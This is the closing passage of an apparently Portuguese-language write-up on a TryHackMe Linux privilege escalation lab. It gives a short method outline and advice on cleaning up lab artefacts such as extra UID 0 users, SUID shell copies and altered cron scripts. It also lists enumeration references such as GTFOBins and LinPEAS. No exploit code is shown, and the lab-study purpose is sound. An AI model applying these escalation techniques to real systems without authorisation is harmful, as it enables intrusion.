Entender a falha
   ↓
Testar a hipótese
   ↓
Confirmar privilégios
~~~

Em laboratórios próprios, vale restaurar um snapshot após as práticas e remover montagens ou artefatos criados durante os testes. Em especial, não mantenha usuários UID 0 adicionais, cópias SUID de shells ou scripts agendados modificados.

### Referências e ferramentas para continuar estudando

- [GTFOBins](https://gtfobins.github.io/) — ótimo para verificar os usos de binários que encontramos durante a enumeração.
- [GTFOBins no GitHub](https://github.com/GTFOBins/GTFOBins.github.io) — repositório do projeto.
- [PEASS-ng / LinPEAS](https://github.com/peass-ng/PEASS-ng) — automação de checks comuns de enumeração e escalação no Linux.
- [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration) — enumeração organizada por níveis de detalhe.
- Manual do próprio Linux: <code>man sudoers</code>, <code>man capabilities</code>, <code>man exports</code>, <code>man crontab</code> e <code>man find</code>.

Os scripts de enumeração ajudam a achar pistas, mas não substituem entender o que cada permissão significa ou por que a configuração é perigosa.

### Próximo laboratório

Na próxima room, [Linux Privilege Escalation: Automation](https://tryhackme.com/room/linprivautomation), o foco será automatizar a enumeração e trabalhar com ferramentas e exploits públicos.

[↑ Voltar ao topo](#topo)
